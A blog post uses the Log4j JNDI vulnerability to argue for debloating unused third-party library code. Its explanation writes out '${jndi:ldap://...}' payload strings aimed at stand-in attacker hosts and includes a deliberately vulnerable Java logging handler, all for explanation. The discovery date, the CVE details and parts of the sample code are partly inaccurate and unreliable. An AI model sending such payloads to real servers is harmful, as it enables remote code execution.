---
layout: post
title: Why Debloating Software Based on Client's Usages?
subtitle: The case of the Log4j vulnerability
tags: security
description: The log4j vulnerability is an example of the dangers of reusing third-party code. In this article, I discuss how debloating software based on client's usage helps to˚ reduce the attack surface of applications that rely on third-party libraries.
keywords:
  - debloating,
  - log4j,
  - security,
  - vulnerabilities,
  - software engineering
image: ../img/posts/2022/2022-06-15/satyr-cover.jpg
share-img: ../img/posts/2022/2022-06-15/satyr-cover.jpg
show-avatar: false
toc: true
date: 2022/06/15
author: cesarsotovalero
published: true
---

Most software applications today are built using third-party libraries and frameworks that together constitute the application's [software supply chain](../blog/the-software-supply-chain.html).
These libraries are often large and complex pieces of engineering, with many features and functionalities to support a wide range of use cases.
Consequently, most applications only use a small subset of these features.
This means that the majority of the code in these libraries is actually unnecessary for the application's correct functionality.
This excess of code could become a security risk, as third-party code can contain dormant vulnerabilities that can be exploited by cyber-attackers.
One way to mitigate this risk is to debloat the software by removing unnecessary features and components.
This article explores the benefits of [debloating software based on client's usage](../blog/diversity-driven-software-debloat.html), and how it can help reduce the attack surface of applications that rely on third-party libraries.
With the recent log4j security vulnerability as an example, this article discusses how debloating could have diminish the impact of such incident.

<figure class="jb_picture">
  {% responsive_image path: img/posts/2022/2022-06-15/satyr.jpg alt:"TODO" %}
  <figcaption class="stroke"> 
    &#169; Let's reuse code, sit, sing, and hope for the best. Photo from a wooden satyr in <a href="https://goo.gl/maps/EjhcQKd9rBBfUTu48">Stockholm City Museum</a>.
  </figcaption>
</figure>

# The Log4j Vulnerability

On December 29<sup>th</sup> 2021, a critical vulnerability was discovered in the popular Java logging library called [log4j2](https://logging.apache.org/log4j/2.x/).
The versions affected ranged [between 2.0-beta9 and 2.14.1 included](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q). 
Once reported and confirmed, this vulnerability received the identifier code [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), so that the security community could track it.

In this case, an attacker with permission to modify the logging configuration file was able to construct a malicious configuration using a [JDBC Appender](https://logging.apache.org/log4j/2.x/manual/appenders.html#jdbcappender) with a data source referencing a Java Naming and Directory Interface URI ([JNDI](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html#:~:text=The%20Java%20Naming%20and%20Directory,any%20specific%20directory%20service%20implementation.)).
This allows the attacker to execute remote code.
The vulnerability stemmed from the [<i class="fab fa-github"></i>`JndiLookup`](https://github.com/apache/logging-log4j2/blob/2.x/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java) class in log4j, which allowed JNDI lookups. 

> The Java Naming and Directory Interface (JNDI) is an API that allows applications to discover and look up data and objects via a name. These objects can be anything from simple data items (like strings and numbers) to more complex network services. JNDI lookup is essentially the process of retrieving an object or piece of data bound to a particular name in a naming or directory service.

When log4j is configured to log unsanitized user input, an attacker can insert a malicious string which would cause log4j to initiate a JNDI lookup.
For example, the string `${jndi:ldap://malicious.server/payload}` would cause log4j to perform a JNDI lookup on the malicious server URI.
This can lead to [Remote Code Execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution) (RCE) because certain JNDI services, like LDAP, can return serialized Java objects, allowing the attacker to run arbitrary code on the affected server.

The attack works as follows:

1. The user sends logging data to the server via TCP, HTTP, or any other protocol allowing this.
2. The server writes in the logs via log4j, adding data containing the malicious payload in the request. For example, appending `${jndi:ldap://malicioussite.com/exploit}`, where `malicioussite.com` is an attacker-controlled server.
3. The log4j vulnerability is triggered and the server makes a request to `malicioussite.com` via JNDI.
4. The response contains a path to a remote Java class file, which will be injected into the server process.
5. The injected payload allows the attacker to execute arbitrary code remotely (e.g., to gain local administrative access on the host).


The following Java code represents a scenario where an attacker can exploit this vulnerability via the [User Agent header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent) of an HTTP request:

```java
/**
* A simple HTTP handler that will process HTTP requests and logs them back.
*/
public class VulnerableLog4jExampleHandler implements HttpHandler {

  static Logger log = Logger.getLogger(log4jExample.class.getName());

  /**
   * A simple HTTP endpoint that reads the request's User Agent and logs it back.
   * @param the HTTP Request Object
   */
  public void handle(HttpExchange he) throws IOException {
    // The User Agent from the HTTP request is retrieved and stored in the userAgent variable.
    string userAgent = he.getRequestHeader("user-agent");
    // Logging the User Agent, this is where the exploit occurs.
    // If an attacker sends a malicious payload like ${jndi:ldap://attacker.com/a} as the User Agent, then
    // log4j will try to resolve this expression, leading to a remote code execution (RCE) vulnerability.
    log.info("Request User Agent:" + userAgent);
    // A response is then generated, echoing back the User Agent within an HTML message and a 200 OK status.
    String response = "<h1>Hello There, " + userAgent + "!</h1>";
    he.sendResponseHeaders(200, response.length());
    OutputStream os = he.getResponseBody();
    os.write(response.getBytes());
    os.close();
  }
}
```

Here's the attack described graphically:

<figure class="jb_picture">
  {% responsive_image path: img/posts/2022/2022-06-15/log4j_attack.png alt:"The log4j JNDI attack and how to prevent it." %}
  <figcaption class="stroke"> 
    Fig 1. The log4j JNDI attack (in black) and how to prevent it (in red). Image source: <a href="https://www.govcert.admin.ch/">Swiss Government Computer Emergency Response Team</a>.
  </figcaption>
</figure>

Because log4j is ubiquitously used in Java applications, this vulnerability was particularly alarming in critical business such as governments and financial institutions.
For example, the Spring Boot framework [uses Log4j](https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot)) immediately released a patch.
Apart from the direct RCE exploit, this vulnerability also opened up doors to other attack vectors like [Denial of Service (DoS)](https://en.wikipedia.org/wiki/Denial-of-service_attack) via extremely resource-intensive JNDI lookups, or Information Disclosure as the malicious server can capture IP addresses of the servers making the lookup.

In summary, the impact of this vulnerability was widespread, affecting countless systems, and requiring immediate patching.
A patch ([version 2.15.0](https://logging.apache.org/log4j/2.x/release-notes/2.15.0.html)) was swiftly released by the Apache Logging team that removed the vulnerable feature, and many organizations rushed to update their log4j versions or implement mitigations like JVM flags or firewall rules.
This incident also highlighted the importance of being cautious when parsing and logging untrusted input, and emphasized the need for regular security reviews of even well-established and trusted libraries in the software ecosystem.

# Software Debloating

The log4j vulnerability brought to light the dangers from the excess of code and features in widely used libraries. 
A library as pervasive as log4j having a critical flaw suggests that even well-maintained codebases can contain dormant vulnerabilities, especially in rarely used features. 
This incident underscores the importance of taking care of the software supply chain of applications by removing or disabling code that is not necessary for its correct functionality.

[Software debloating](../software-debloating-papers.html) allows organizations to reduce the attack surface of their applications by removing unnecessary features and components.
The idea is simple: if parts of a library or software aren't present, they can't be exploited.
Based on this premise, fewer components and lines of code in a software product can lead to fewer vulnerabilities, as there is fewer points for an attacker to target.

For example, many applications that used log4j didn't even require the `JndiLookup` functionality or the ability to process JNDI lookups. 
However, since this feature was present in the log4j dependency, and it was integrated into their applications, they became vulnerable.
If this feature had been removed or wasn't a part of the version of the library they were using, the vulnerability would have had no impact on them, even if the flaw still existed in the code of the broader log4j project.

Henceforth, if an organization had debloated their version of log4j, removing features and components they didn't use, including the `JndiLookup` class from their classpath, they would have naturally been immune to this particular vulnerability.
This example underscores the principle that removing or disabling unnecessary components can reduce the potential points of failure or exploitation in software.

# Software Debloating Strategies

There are several strategies for debloating software, each with its own advantages and disadvantages.
The following are the three most common approaches, and how they might have helped at mitigating the log4j vulnerability. 

## Static Analysis-Based Debloating

  - **Principle**: Detect and remove unused code without executing it.
  - **Advantages**: As there is no need to run the software, it is usually faster than dynamic analysis so it can be integrated into build processes.
  - **Challenges**: Over-approximation might lead to removing code that's actually needed or under-approximation might leave more code than necessary. Static analysis is particularly [challenging for dynamic languages like Java](../blog/the-dynamic-features-of-java.html), where code is loaded at runtime.
  - **How it could have helped**: By using tools like [ProGuard](https://en.wikipedia.org/wiki/ProGuard) for Java, which can identify and remove unused classes, fields, methods, and attributes from compiled applications, most applications could have removed the `JndiLookup`  class from the classpath.

## **Dynamic Analysis-Based Debloating**

  - **Principle**: Detect and remove the code that is not executed, typically under various scenarios and with the help of instrumentation.
  - **Advantages**: The usage information collected is more accurate than static analysis since it's based on real execution patterns.
  - **Challenges**: It needs representative workloads or usage scenarios which are difficult to collect in practice. Might miss some code paths that are only invoked in rare situations, causing crashes or unexpected behavior.
  - **How it could have helped**: Profiling a Java application during its runtime to see which methods of a library like log4j are invoked and which aren't. If certain methods are never called across various representative runs, they can be considered for removal. 

## **Hybrid-Based Debloating**

  - **Principle**: Combines both static and dynamic analysis. Software is first profiled using dynamic analysis to collect data on which parts are most used, then that data guides static debloating processes.
  - **Advantages**: Combines the accuracy of dynamic analysis with the thoroughness of static analysis tools.
  - **Challenges**: The process is more complex, as it needs both runtime profiling and post-profiling analysis stages.
  - **How it could have helped**: Running a Java application under peak loads to gather profile data, and then passing that data to a tool that prunes unused parts of libraries like log4j. Profile-guided debloating tools could have identified that the `JndiLookup` class was never used in the application, and therefore could have removed it from the classpath.

# Conclusion

{% badge ../files/thesis/thesis_first_page.png 140 ../files/thesis/cesar-fulltext.pdf %}
The log4j vulnerability offers a poignant lesson on the latent dangers of reusing third-party code.
It emphasizes the security benefits of minimizing codebases and removed unused features from dependencies.
Ideally, developers should put in production only what is necessary for a given application or service, thereby reducing its overall attack surface.
In our increasingly security-conscious world, using code debloating techniques that are based on user usage might shift from being a code minimization strategy to becoming a critical security measure to avoid future incidents like the log4j vulnerability.

**UPDATE:** If you want to learn more about software debloating in Java, I wrote a PhD thesis on this subject, check it out [here](../files/thesis/cesar-fulltext.pdf).

# References

- [Vulnerability Affecting Multiple Log4j Versions Permits RCE Exploit](https://www.infoq.com/news/2021/12/log4j-zero-day-vulnerability/)
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html#fixed-in-log4j-2-15-0-java-8)
- [Zero-Day Exploit Targeting Popular Java Library Log4j](https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)
